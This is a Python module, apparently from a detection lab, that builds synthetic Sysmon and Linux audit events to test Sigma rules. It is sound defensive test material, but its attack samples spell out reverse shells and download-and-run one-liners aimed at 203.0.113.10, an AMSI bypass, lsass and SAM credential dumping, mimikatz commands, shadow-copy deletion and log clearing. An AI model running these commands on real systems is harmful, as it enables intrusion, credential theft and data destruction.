"""Sample telemetry for every Sigma rule: events that must fire and events that must not.

The events are synthetic. They are shaped like the ECS documents that Elastic
Agent produces for Sysmon and for Linux process auditing. They carry the
command lines of real techniques. Nothing here was captured from a real host.

Each rule has "attack" events (one for every branch of its logic) and "benign"
events that sit close to the rule without crossing it. `python -m detlab
build-samples` writes them to simulations/events/. A test fails when the files
on disk differ from what this module builds.
"""

import json
from datetime import datetime, timedelta, timezone
from typing import Any

from detlab import authlog

START = datetime(2026, 11, 10, 9, 0, 0, tzinfo=timezone.utc)

SYSMON = "Microsoft-Windows-Sysmon"
SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"
SYSTEM32 = "C:\\Windows\\System32\\"
POWERSHELL = SYSTEM32 + "WindowsPowerShell\\v1.0\\powershell.exe"
EXPLORER = "C:\\Windows\\explorer.exe"
CMD = SYSTEM32 + "cmd.exe"

# What Sysmon reports as OriginalFileName for the binaries the samples use.
ORIGINAL_NAMES = {
    "powershell.exe": "PowerShell.EXE", "pwsh.exe": "pwsh.dll", "cmd.exe": "Cmd.Exe", "certutil.exe": "CertUtil.exe",
    "rundll32.exe": "RUNDLL32.EXE", "regsvr32.exe": "REGSVR32.EXE", "mshta.exe": "MSHTA.EXE",
    "bitsadmin.exe": "bitsadmin.exe", "schtasks.exe": "schtasks.exe", "sc.exe": "sc.exe", "reg.exe": "reg.exe",
    "net.exe": "net.exe", "net1.exe": "net1.exe", "nltest.exe": "nltestrk.exe", "wmic.exe": "wmic.exe",
    "vssadmin.exe": "VSSADMIN.EXE", "wbadmin.exe": "WBADMIN.EXE", "bcdedit.exe": "bcdedit.exe",
    "wevtutil.exe": "wevtutil.exe", "rclone.exe": "rclone.exe", "procdump.exe": "procdump",
    "procdump64.exe": "procdump", "wscript.exe": "wscript.exe",
}


def _name(path: str) -> str:
    return path.replace("/", "\\").rsplit("\\", 1)[-1]


def win_process(image: str, command_line: str, parent: str = EXPLORER, parent_command_line: str = "",
                user: str = "jdoe", host: str = "WS-FIN-07", original: str = "") -> dict[str, Any]:
    """Sysmon event 1: process creation."""
    file_name = _name(image)
    return {
        "event": {"code": "1", "provider": SYSMON, "category": "process", "type": "start", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "Process Create (rule: ProcessCreate)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "winlog": {"channel": SYSMON_CHANNEL},
        "user": {"name": user, "domain": "LAB"},
        "process": {
            "executable": image, "name": file_name, "command_line": command_line,
            "working_directory": "C:\\Users\\" + user + "\\",
            "pe": {"original_file_name": original or ORIGINAL_NAMES.get(file_name.lower(), file_name)},
            "parent": {"executable": parent, "name": _name(parent),
                       "command_line": parent_command_line or parent},
        },
    }


def win_process_access(source: str, target: str, access: str, host: str = "WS-FIN-07") -> dict[str, Any]:
    """Sysmon event 10: one process opens another."""
    return {
        "event": {"code": "10", "provider": SYSMON, "category": "process", "type": "access", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "Process accessed (rule: ProcessAccess)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "process": {"executable": source, "name": _name(source)},
        "winlog": {"channel": SYSMON_CHANNEL, "event_data": {"TargetImage": target, "GrantedAccess": access}},
    }


def win_registry_set(image: str, key: str, value: str, host: str = "WS-FIN-07") -> dict[str, Any]:
    """Sysmon event 13: registry value set."""
    return {
        "event": {"code": "13", "provider": SYSMON, "category": "registry", "type": "change", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "Registry value set (rule: RegistryEvent)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "winlog": {"channel": SYSMON_CHANNEL},
        "process": {"executable": image, "name": _name(image)},
        "registry": {"path": key, "data": {"strings": value}},
    }


def win_file_create(image: str, path: str, host: str = "WS-FIN-07") -> dict[str, Any]:
    """Sysmon event 11: file created."""
    return {
        "event": {"code": "11", "provider": SYSMON, "category": "file", "type": "creation", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "File created (rule: FileCreate)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "winlog": {"channel": SYSMON_CHANNEL},
        "process": {"executable": image, "name": _name(image)},
        "file": {"path": path, "name": _name(path)},
    }


def win_dns_query(image: str, name: str, host: str = "WS-FIN-07") -> dict[str, Any]:
    """Sysmon event 22: DNS query."""
    return {
        "event": {"code": "22", "provider": SYSMON, "category": "network", "type": "protocol", "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": "Dns query (rule: DnsQuery)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "winlog": {"channel": SYSMON_CHANNEL},
        "process": {"executable": image, "name": _name(image)},
        "dns": {"question": {"name": name}},
    }


def win_network(image: str, ip: str, port: int, domain: str = "", host: str = "WS-FIN-07") -> dict[str, Any]:
    """Sysmon event 3: network connection."""
    return {
        "event": {"code": "3", "provider": SYSMON, "category": "network", "type": "connection", "kind": "event",
                  "dataset": "windows.sysmon_operational",
                  "action": "Network connection detected (rule: NetworkConnect)"},
        "host": {"name": host, "os": {"type": "windows"}},
        "winlog": {"channel": SYSMON_CHANNEL, "event_data": {"Protocol": "tcp", "Initiated": "true"}},
        "process": {"executable": image, "name": _name(image)},
        "destination": {"ip": ip, "port": str(port), "domain": domain},
    }


def win_sysmon(code: int, action: str, category: str, image: str = "", path: str = "",
               host: str = "WS-FIN-07", **data: str) -> dict[str, Any]:
    """Any other Sysmon event: 2 (file creation time), 8 (remote thread), 19 to 21 (WMI)."""
    event: dict[str, Any] = {
        "event": {"code": str(code), "provider": SYSMON, "category": category, "kind": "event",
                  "dataset": "windows.sysmon_operational", "action": action},
        "host": {"name": host, "os": {"type": "windows"}},
        "winlog": {"channel": SYSMON_CHANNEL, "event_data": dict(data)},
    }
    if image:
        event["process"] = {"executable": image, "name": _name(image)}
    if path:
        event["file"] = {"path": path, "name": _name(path)}
    return event


def win_log(channel: str, provider: str, code: int, action: str, host: str = "WS-FIN-07",
            **data: str) -> dict[str, Any]:
    """An event from the Security or System log. Its fields sit under winlog.event_data, as Winlogbeat stores them."""
    return {
        "event": {"code": str(code), "provider": provider, "kind": "event", "action": action,
                  "dataset": f"windows.{channel.lower()}"},
        "host": {"name": host, "os": {"type": "windows"}},
        "winlog": {"channel": channel, "event_data": dict(data)},
    }


def security(code: int, action: str, **data: str) -> dict[str, Any]:
    return win_log("Security", "Microsoft-Windows-Security-Auditing", code, action, **data)


def service_installed(name: str, image_path: str, host: str = "SRV-APP-02") -> dict[str, Any]:
    """System event 7045: a service was installed."""
    return win_log("System", "Service Control Manager", 7045, "A service was installed in the system", host=host,
                   ServiceName=name, ImagePath=image_path, ServiceType="user mode service",
                   StartType="auto start", AccountName="LocalSystem")


def linux_process(executable: str, command_line: str, parent: str = "/usr/bin/bash", user: str = "deploy",
                  host: str = "web-01") -> dict[str, Any]:
    """Process start on Linux, as reported by process auditing."""
    return {
        "event": {"category": "process", "type": "start", "kind": "event", "dataset": "auditd.log",
                  "action": "executed"},
        "host": {"name": host, "os": {"type": "linux"}},
        "user": {"name": user},
        "process": {"executable": executable, "name": executable.rsplit("/", 1)[-1], "command_line": command_line,
                    "working_directory": "/home/" + user if user != "root" else "/root",
                    "parent": {"executable": parent, "name": parent.rsplit("/", 1)[-1]}},
    }


def sh(command: str, user: str = "deploy") -> dict[str, Any]:
    """A command run through `sh -c`, which is how pipes and redirects reach the process log."""
    return linux_process("/usr/bin/sh", f"sh -c {command}", user=user)


WINWORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
EXCEL = "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
SID_RUN = "HKU\\S-1-5-21-1004336348-1177238915-682003330-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
STARTUP = "C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
LSASS = SYSTEM32 + "lsass.exe"
ENCODED = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"

# rule key -> (attack events, benign events)
CASES: dict[str, tuple[list[dict[str, Any]], list[dict[str, Any]]]] = {
    "win_powershell_encoded_command": (
        [win_process(POWERSHELL, f"powershell.exe -NoP -NonI -W Hidden -Enc {ENCODED}", parent=CMD),
         win_process("C:\\Program Files\\PowerShell\\7\\pwsh.exe", f"pwsh.exe -EncodedCommand {ENCODED}")],
        [win_process(POWERSHELL, "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\inventory.ps1"),
         win_process(POWERSHELL, f"powershell.exe -NoProfile -enc {ENCODED}",
                     parent="C:\\Windows\\CCM\\CcmExec.exe", user="SYSTEM")],
    ),
    "win_powershell_download_cradle": (
        [win_process(POWERSHELL, "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient)"
                                 ".DownloadString('http://203.0.113.10/a.ps1')\"", parent=CMD)],
        [win_process(POWERSHELL, "powershell.exe -Command \"Invoke-WebRequest -Uri "
                                 "https://updates.example.com/agent.msi -OutFile C:\\Temp\\agent.msi\"")],
    ),
    "win_mshta_remote_payload": (
        [win_process(SYSTEM32 + "mshta.exe", "mshta.exe http://203.0.113.10/update.hta"),
         win_process(SYSTEM32 + "mshta.exe", "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\")"
                                             ".Run \"\"calc.exe\"\":close\")")],
        [win_process(SYSTEM32 + "mshta.exe", "mshta.exe \"C:\\Program Files\\LegacyApp\\launcher.hta\"")],
    ),
    "win_regsvr32_scriptlet": (
        [win_process(SYSTEM32 + "regsvr32.exe", "regsvr32.exe /s /n /u /i:http://203.0.113.10/payload.sct scrobj.dll")],
        [win_process(SYSTEM32 + "regsvr32.exe", "regsvr32.exe /s C:\\Windows\\System32\\vbscript.dll")],
    ),
    "win_rundll32_script_protocol": (
        [win_process(SYSTEM32 + "rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";"
                                                "document.write();GetObject(\"script:http://203.0.113.10/s.sct\")")],
        [win_process(SYSTEM32 + "rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl")],
    ),
    "win_certutil_download": (
        [win_process(SYSTEM32 + "certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.10/p.exe "
                                                "C:\\Users\\Public\\p.exe", parent=CMD)],
        [win_process(SYSTEM32 + "certutil.exe", "certutil.exe -hashfile C:\\Downloads\\setup.exe SHA256")],
    ),
    "win_certutil_decode": (
        [win_process(SYSTEM32 + "certutil.exe",
                     "certutil.exe -decode C:\\Users\\Public\\p.b64 C:\\Users\\Public\\p.exe", parent=CMD)],
        [win_process(SYSTEM32 + "certutil.exe", "certutil.exe -dump C:\\Certs\\server.cer")],
    ),
    "win_bitsadmin_download": (
        [win_process(SYSTEM32 + "bitsadmin.exe", "bitsadmin.exe /transfer job1 /download /priority high "
                                                 "http://203.0.113.10/p.exe C:\\Users\\Public\\p.exe", parent=CMD)],
        [win_process(SYSTEM32 + "bitsadmin.exe", "bitsadmin.exe /list /allusers")],
    ),
    "win_schtasks_create_suspicious_action": (
        [win_process(SYSTEM32 + "schtasks.exe", "schtasks.exe /create /sc minute /mo 30 /tn \"Updater\" "
                                                "/tr \"C:\\Users\\Public\\updater.exe\" /f", parent=CMD)],
        [win_process(SYSTEM32 + "schtasks.exe", "schtasks.exe /create /sc daily /tn \"Nightly Backup\" "
                                                "/tr \"C:\\Program Files\\Backup\\backup.exe\" /st 02:00"),
         win_process(SYSTEM32 + "schtasks.exe", "schtasks.exe /query /fo LIST")],
    ),
    "win_service_create_user_writable_path": (
        [win_process(SYSTEM32 + "sc.exe", "sc.exe create WinUpdateSvc binPath= \"C:\\Users\\Public\\svc.exe\" "
                                          "start= auto", parent=CMD)],
        [win_process(SYSTEM32 + "sc.exe", "sc.exe create AcmeAgent binPath= \"C:\\Program Files\\Acme\\agent.exe\" "
                                          "start= auto"),
         win_process(SYSTEM32 + "sc.exe", "sc.exe query type= service")],
    ),
    "win_registry_run_key_suspicious_value": (
        [win_registry_set("C:\\Users\\Public\\updater.exe", SID_RUN + "Updater", "C:\\Users\\Public\\updater.exe"),
         win_registry_set(SYSTEM32 + "reg.exe", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Setup",
                          "powershell.exe -w hidden -c \"& C:\\ProgramData\\s.ps1\"")],
        [win_registry_set("C:\\Program Files\\Microsoft OneDrive\\OneDriveSetup.exe", SID_RUN + "OneDrive",
                          "\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background")],
    ),
    "win_startup_folder_script_drop": (
        [win_file_create(POWERSHELL, STARTUP + "update.vbs")],
        [win_file_create("C:\\Program Files\\Microsoft OneDrive\\OneDriveSetup.exe", STARTUP + "OneDrive.lnk"),
         win_file_create(POWERSHELL, "C:\\Users\\jdoe\\Documents\\report.ps1")],
    ),
    "win_lsass_dump_comsvcs_procdump": (
        [win_process(SYSTEM32 + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 "
                                                "C:\\Windows\\Temp\\l.dmp full", parent=CMD, user="SYSTEM"),
         win_process("C:\\Users\\Public\\procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe "
                                                          "C:\\Windows\\Temp\\l.dmp", parent=CMD)],
        [win_process("C:\\Tools\\Sysinternals\\procdump.exe", "procdump.exe -ma notepad.exe C:\\Dumps\\notepad.dmp")],
    ),
    "win_lsass_process_access": (
        [win_process_access("C:\\Users\\Public\\m.exe", LSASS, "0x1010")],
        [win_process_access("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe",
                            LSASS, "0x1410"),
         win_process_access("C:\\Program Files\\Mozilla Firefox\\firefox.exe", LSASS, "0x1000")],
    ),
    "win_reg_save_credential_hives": (
        [win_process(SYSTEM32 + "reg.exe", "reg.exe save hklm\\sam C:\\Windows\\Temp\\sam.save", parent=CMD),
         win_process(SYSTEM32 + "reg.exe", "reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save", parent=CMD)],
        [win_process(SYSTEM32 + "reg.exe", "reg.exe save hkcu\\Software\\Vendor C:\\Backup\\vendor.hiv"),
         win_process(SYSTEM32 + "reg.exe", "reg.exe query hklm\\system\\CurrentControlSet\\Services\\Tcpip")],
    ),
    "win_shadow_copy_deletion": (
        [win_process(SYSTEM32 + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", parent=CMD),
         win_process(SYSTEM32 + "wbem\\WMIC.exe", "wmic.exe shadowcopy delete", parent=CMD),
         win_process(SYSTEM32 + "wbadmin.exe", "wbadmin.exe delete catalog -quiet", parent=CMD),
         win_process(SYSTEM32 + "bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled no", parent=CMD)],
        [win_process(SYSTEM32 + "vssadmin.exe", "vssadmin.exe list shadows"),
         win_process(SYSTEM32 + "bcdedit.exe", "bcdedit.exe /enum")],
    ),
    "win_event_log_clearing": (
        [win_process(SYSTEM32 + "wevtutil.exe", "wevtutil.exe cl Security", parent=CMD),
         win_process(POWERSHELL, "powershell.exe -Command \"Clear-EventLog -LogName Security\"", parent=CMD)],
        [win_process(SYSTEM32 + "wevtutil.exe", "wevtutil.exe qe System /c:5 /f:text")],
    ),
    "win_defender_tampering": (
        [win_process(POWERSHELL, "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
                     parent=CMD),
         win_process(POWERSHELL, "powershell.exe Add-MpPreference -ExclusionPath C:\\Users\\Public", parent=CMD)],
        [win_process(POWERSHELL, "powershell.exe -Command \"Get-MpPreference | Select-Object "
                                 "DisableRealtimeMonitoring\"")],
    ),
    "win_local_account_or_admin_added": (
        [win_process(SYSTEM32 + "net.exe", "net.exe user svc_backup Winter2026! /add", parent=CMD),
         win_process(SYSTEM32 + "net1.exe", "net1 localgroup administrators svc_backup /add",
                     parent=SYSTEM32 + "net.exe")],
        [win_process(SYSTEM32 + "net.exe", "net.exe user"),
         win_process(SYSTEM32 + "net.exe", "net.exe localgroup administrators")],
    ),
    "win_domain_trust_discovery_nltest": (
        [win_process(SYSTEM32 + "nltest.exe", "nltest.exe /domain_trusts /all_trusts", parent=CMD)],
        [win_process(SYSTEM32 + "nltest.exe", "nltest.exe /sc_query:LAB")],
    ),
    "win_psexec_service_child_process": (
        [win_process(CMD, "cmd.exe /c ipconfig /all", parent="C:\\Windows\\PSEXESVC.exe", user="SYSTEM",
                     host="SRV-APP-02")],
        [win_process(CMD, "cmd.exe /c ipconfig /all", parent=SYSTEM32 + "services.exe", user="SYSTEM",
                     host="SRV-APP-02")],
    ),
    "win_wmic_remote_process_create": (
        [win_process(SYSTEM32 + "wbem\\WMIC.exe", "wmic.exe /node:10.20.30.40 /user:LAB\\admin process call create "
                                                  "\"cmd.exe /c whoami\"", parent=CMD)],
        [win_process(SYSTEM32 + "wbem\\WMIC.exe", "wmic.exe os get Caption,Version")],
    ),
    "win_office_spawns_script_host": (
        [win_process(CMD, "cmd.exe /c whoami", parent=WINWORD),
         win_process(SYSTEM32 + "wscript.exe", "wscript.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\invoice.js",
                     parent=EXCEL)],
        [win_process("C:\\Windows\\splwow64.exe", "C:\\Windows\\splwow64.exe 12288", parent=WINWORD)],
    ),
    "win_renamed_powershell": (
        [win_process("C:\\Users\\Public\\svchost.exe", "svchost.exe -nop -c \"Get-Process\"", parent=CMD,
                     original="PowerShell.EXE")],
        [win_process(POWERSHELL, "powershell.exe -NoLogo")],
    ),
    "win_dns_query_ddns_provider": (
        [win_dns_query("C:\\Users\\Public\\updater.exe", "c2-update.duckdns.org")],
        [win_dns_query("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "www.example.com")],
    ),
    "win_rclone_data_transfer": (
        [win_process("C:\\Users\\Public\\rclone.exe", "rclone.exe copy C:\\Shares\\Finance mega:backup "
                                                      "--config C:\\Users\\Public\\r.conf", parent=CMD)],
        [win_process("C:\\Tools\\rclone\\rclone.exe", "rclone.exe version")],
    ),
    "lnx_reverse_shell_oneliner": (
        [linux_process("/usr/bin/bash", "bash -c bash -i >& /dev/tcp/203.0.113.10/4444 0>&1", user="www-data"),
         linux_process("/usr/bin/nc", "nc -e /bin/sh 203.0.113.10 4444", user="www-data")],
        [linux_process("/usr/bin/nc", "nc -zv db-01 5432")],
    ),
    "lnx_download_piped_to_shell": (
        [sh("curl -fsSL http://203.0.113.10/i.sh | sh", user="www-data"),
         linux_process("/usr/bin/bash", "bash -c wget -qO- http://203.0.113.10/i.sh | bash -s stage2")],
        [sh("curl -s https://status.example.com/health | shasum -a 256"),
         linux_process("/usr/bin/curl", "curl -fsSLO https://releases.example.com/tool.tar.gz")],
    ),
    "lnx_cron_persistence_write": (
        [sh("echo \"*/5 * * * * root /usr/local/bin/.sync\" >> /etc/crontab", user="root")],
        [linux_process("/usr/bin/cat", "cat /etc/crontab"),
         linux_process("/usr/bin/crontab", "crontab -l")],
    ),
    "lnx_authorized_keys_write": (
        [sh("echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ0 ops@jump >> /root/.ssh/authorized_keys", user="root")],
        [linux_process("/usr/bin/cat", "cat /home/deploy/.ssh/authorized_keys")],
    ),
    "lnx_shell_history_tampering": (
        [linux_process("/usr/bin/bash", "bash -c history -c", user="root"),
         sh("rm -f /root/.bash_history", user="root")],
        [linux_process("/usr/bin/wc", "wc -l /home/deploy/.bash_history")],
    ),
    "lnx_setuid_bit_on_shell": (
        [linux_process("/usr/bin/chmod", "chmod u+s /bin/bash", user="root"),
         linux_process("/usr/bin/chmod", "chmod 4755 /tmp/.x", user="root")],
        [linux_process("/usr/bin/chmod", "chmod 755 /opt/app/run.sh"),
         linux_process("/usr/bin/chmod", "chmod +x /tmp/install.sh")],
    ),
    "lnx_shadow_file_read": (
        [linux_process("/usr/bin/cat", "cat /etc/shadow", user="root")],
        [linux_process("/usr/bin/cat", "cat /etc/passwd"),
         linux_process("/usr/bin/passwd", "passwd -S deploy", user="root")],
    ),
    "lnx_uid_zero_account_created": (
        [linux_process("/usr/sbin/useradd", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate", user="root")],
        [linux_process("/usr/sbin/useradd", "useradd -m -s /bin/bash alice", user="root")],
    ),
    "lnx_firewall_disabled": (
        [linux_process("/usr/sbin/ufw", "ufw disable", user="root"),
         linux_process("/usr/sbin/iptables", "iptables -F", user="root"),
         linux_process("/usr/bin/systemctl", "systemctl stop firewalld", user="root")],
        [linux_process("/usr/sbin/ufw", "ufw status verbose", user="root"),
         linux_process("/usr/sbin/iptables", "iptables -L -n", user="root"),
         linux_process("/usr/bin/systemctl", "systemctl status firewalld", user="root"),
         linux_process("/usr/bin/systemctl", "systemctl restart nginx", user="root")],
    ),
    "lnx_sudoers_modification": (
        [sh("echo \"deploy ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers", user="root")],
        [linux_process("/usr/bin/cat", "cat /etc/sudoers", user="root"),
         linux_process("/usr/sbin/visudo", "visudo -c", user="root")],
    ),
    "lnx_crypto_miner_execution": (
        [linux_process("/tmp/.x/kworker", "/tmp/.x/kworker -o stratum+tcp://pool.example.net:3333 -u wallet "
                                          "--donate-level 1", user="www-data")],
        [linux_process("/usr/bin/stress-ng", "stress-ng --cpu 4 --timeout 60s")],
    ),
}

# Rules that came out of running the attack simulator's scenarios against the lab.
TEMP = "C:\\Users\\jdoe\\AppData\\Local\\Temp\\"
DEFENDER_KEY = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\"
AMSI_BYPASS = ("powershell.exe -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
               ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"")
CASES.update({
    "win_masquerading_system_binary_wrong_path": (
        [win_process(TEMP + "svchost.exe", TEMP + "svchost.exe", parent=POWERSHELL),
         win_process("C:\\ProgramData\\lsass.exe", "lsass.exe", parent=CMD)],
        [win_process(SYSTEM32 + "services.exe", "C:\\Windows\\System32\\services.exe",
                     parent=SYSTEM32 + "wininit.exe", user="SYSTEM"),
         win_process("C:\\Windows\\SysWOW64\\svchost.exe", "svchost.exe -k netsvcs", parent=SYSTEM32 + "services.exe",
                     user="SYSTEM")],
    ),
    "win_reg_add_run_key": (
        [win_process(SYSTEM32 + "reg.exe",
                     "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" "
                     "/v Updater /t REG_SZ /d \"C:\\Users\\Public\\updater.exe\" /f", parent=CMD)],
        [win_process(SYSTEM32 + "reg.exe", "reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\""),
         win_process(SYSTEM32 + "reg.exe", "reg.exe add \"HKCU\\Software\\Vendor\\App\" /v Theme /d dark /f")],
    ),
    "win_archive_password_protected": (
        [win_process("C:\\Program Files\\7-Zip\\7z.exe", "7z.exe a -pS3cret C:\\Temp\\data.7z C:\\Shares\\Finance\\*",
                     parent=CMD, original="7z.exe"),
         win_process("C:\\Program Files\\WinRAR\\rar.exe", "rar.exe a -hpS3cret C:\\Temp\\d.rar C:\\Shares\\HR",
                     parent=CMD, original="rar.exe")],
        [win_process("C:\\Program Files\\7-Zip\\7z.exe", "7z.exe a C:\\Backup\\logs.7z C:\\Logs\\*.log",
                     original="7z.exe"),
         win_process("C:\\Program Files\\7-Zip\\7z.exe", "7z.exe x -pS3cret C:\\Downloads\\archive.7z",
                     original="7z.exe")],
    ),
    "win_powershell_http_upload": (
        [win_process(POWERSHELL, "powershell.exe -c \"Invoke-WebRequest -Uri https://files.example.org/u "
                                 "-Method POST -InFile C:\\Temp\\data.7z\"", parent=CMD),
         win_process("C:\\Program Files\\PowerShell\\7\\pwsh.exe", "pwsh.exe -Command \"Invoke-RestMethod -Uri "
                     "https://files.example.org/u -Method PUT -InFile C:\\Temp\\d.zip\"", parent=CMD)],
        [win_process(POWERSHELL, "powershell.exe -Command \"Invoke-RestMethod -Uri https://api.example.com/status "
                                 "-Method GET\""),
         win_process(POWERSHELL, "powershell.exe -Command \"Invoke-RestMethod -Uri https://api.example.com/jobs "
                                 "-Method POST -Body '{}'\"")],
    ),
    "win_powershell_amsi_bypass": (
        [win_process(POWERSHELL, AMSI_BYPASS, parent=CMD)],
        [win_process(POWERSHELL, "powershell.exe -Command \"Get-MpComputerStatus | Select-Object AMServiceEnabled\"")],
    ),
    "win_mimikatz_command_line": (
        [win_process("C:\\Users\\Public\\mimikatz.exe", "mimikatz.exe \"privilege::debug\" "
                     "\"sekurlsa::logonpasswords\" exit", parent=CMD, original="mimikatz.exe"),
         win_process("C:\\Users\\Public\\m.exe", "m.exe \"lsadump::sam\" exit", parent=CMD, original="m.exe"),
         win_process("C:\\Users\\Public\\notes.exe", "notes.exe", parent=CMD, original="mimikatz.exe")],
        [win_process(SYSTEM32 + "notepad.exe", "notepad.exe C:\\Users\\jdoe\\Documents\\mimikatz-report.txt")],
    ),
    "win_suspicious_process_outbound_connection": (
        [win_network(POWERSHELL, "203.0.113.10", 443, "update-service.example.com"),
         win_network(TEMP + "updater.exe", "198.51.100.25", 443, "cdn-update.example.net")],
        [win_network(POWERSHELL, "10.10.20.80", 443, "intranet.lab-example.com"),
         win_network("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "203.0.113.10", 443,
                     "www.example.com")],
    ),
    "win_remote_admin_port_from_shell": (
        [win_network(CMD, "10.10.20.50", 445), win_network(SYSTEM32 + "wbem\\WMIC.exe", "10.10.20.51", 135),
         win_network(POWERSHELL, "10.10.20.52", 5985)],
        [win_network(SYSTEM32 + "svchost.exe", "10.10.20.50", 445), win_network(CMD, "10.10.20.80", 80)],
    ),
    "win_script_host_drops_executable": (
        [win_file_create(POWERSHELL, TEMP + "update.exe"), win_file_create(WINWORD, "C:\\Users\\Public\\helper.dll")],
        [win_file_create(POWERSHELL, "C:\\Users\\jdoe\\Documents\\report.csv"),
         win_file_create(SYSTEM32 + "msiexec.exe", "C:\\ProgramData\\Vendor\\agent.exe")],
    ),
    "win_file_creation_time_changed": (
        [win_sysmon(2, "File creation time changed (rule: FileCreateTime)", "file", image="C:\\Temp\\timestomp.exe",
                    path="C:\\ProgramData\\update.exe", CreationUtcTime="2019-01-01 00:00:00.000",
                    PreviousCreationUtcTime="2026-11-10 09:30:00.000")],
        [win_sysmon(2, "File creation time changed (rule: FileCreateTime)", "file",
                    image="C:\\Program Files\\7-Zip\\7z.exe", path="C:\\Users\\jdoe\\Documents\\old.txt",
                    CreationUtcTime="2024-03-01 10:00:00.000", PreviousCreationUtcTime="2026-11-10 09:30:00.000"),
         win_sysmon(2, "File creation time changed (rule: FileCreateTime)", "file", image=EXPLORER,
                    path="C:\\Users\\jdoe\\Pictures\\scan.png", CreationUtcTime="2025-01-01 10:00:00.000",
                    PreviousCreationUtcTime="2026-11-10 09:30:00.000")],
    ),
    "win_remote_thread_from_user_folder": (
        [win_sysmon(8, "CreateRemoteThread detected (rule: CreateRemoteThread)", "process",
                    image="C:\\Temp\\loader.exe", TargetImage=SYSTEM32 + "svchost.exe", StartAddress="0x7FFE0000"),
         win_sysmon(8, "CreateRemoteThread detected (rule: CreateRemoteThread)", "process",
                    image="C:\\Users\\jdoe\\AppData\\Roaming\\inj.exe", TargetImage=EXPLORER,
                    StartAddress="0x00007FF6A0000000")],
        [win_sysmon(8, "CreateRemoteThread detected (rule: CreateRemoteThread)", "process",
                    image=SYSTEM32 + "csrss.exe", TargetImage=SYSTEM32 + "conhost.exe", StartAddress="0x7FFA0000")],
    ),
    "win_wmi_event_subscription": (
        [win_sysmon(19, "WmiEventFilter activity detected (rule: WmiEvent)", "configuration", Operation="Created",
                    EventNamespace="root\\subscription", Name="SystemHealthCheck"),
         win_sysmon(20, "WmiEventConsumer activity detected (rule: WmiEvent)", "configuration", Operation="Created",
                    Name="SystemHealthCheck", Type="Command Line", Destination="C:\\ProgramData\\update.exe"),
         win_sysmon(21, "WmiEventConsumerToFilter activity detected (rule: WmiEvent)", "configuration",
                    Operation="Created", Consumer="SystemHealthCheck", Filter="SystemHealthCheck")],
        [win_sysmon(19, "WmiEventFilter activity detected (rule: WmiEvent)", "configuration", Operation="Deleted",
                    EventNamespace="root\\subscription", Name="OldInventoryFilter")],
    ),
    "win_defender_disabled_registry": (
        [win_registry_set(POWERSHELL, DEFENDER_KEY + "DisableAntiSpyware", "DWORD (0x00000001)"),
         win_registry_set(SYSTEM32 + "reg.exe", DEFENDER_KEY + "Real-Time Protection\\DisableRealtimeMonitoring",
                          "DWORD (0x00000001)")],
        [win_registry_set(SYSTEM32 + "svchost.exe", DEFENDER_KEY + "DisableAntiSpyware", "DWORD (0x00000000)"),
         win_registry_set(SYSTEM32 + "svchost.exe", DEFENDER_KEY + "Signature Updates\\ForceUpdateFromMU",
                          "DWORD (0x00000001)")],
    ),
    "win_security_log_cleared": (
        [win_log("Security", "Microsoft-Windows-Eventlog", 1102, "The audit log was cleared",
                 SubjectUserName="administrator", SubjectDomainName="LAB")],
        [win_log("Security", "Microsoft-Windows-Eventlog", 1100, "The event logging service has shut down")],
    ),
    "win_scheduled_task_created_suspicious_command": (
        [security(4698, "A scheduled task was created", SubjectUserName="administrator",
                  TaskName="\\Microsoft\\Windows\\Maintenance\\SystemUpdate",
                  TaskContent="<Exec><Command>C:\\ProgramData\\update.exe</Command></Exec>"),
         security(4698, "A scheduled task was created", SubjectUserName="jdoe", TaskName="\\Updater",
                  TaskContent="<Exec><Command>powershell.exe</Command><Arguments>-w hidden -File "
                              "C:\\Users\\Public\\s.ps1</Arguments></Exec>")],
